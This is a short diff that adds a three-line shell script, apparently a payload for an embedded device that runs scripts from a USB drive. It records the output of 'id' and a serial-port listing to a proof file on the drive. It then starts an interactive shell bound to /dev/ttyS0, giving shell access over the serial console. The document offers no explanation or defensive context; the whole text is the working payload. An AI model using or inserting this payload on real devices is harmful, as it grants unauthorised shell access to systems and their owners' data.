@@ -1,0 +1,3 @@
+id > /media/sda1/proof.txt
+ls -l /dev/ttyS0 >> /media/sda1/proof.txt
+exec sh -i </dev/ttyS0 >/dev/ttyS0 2>&1
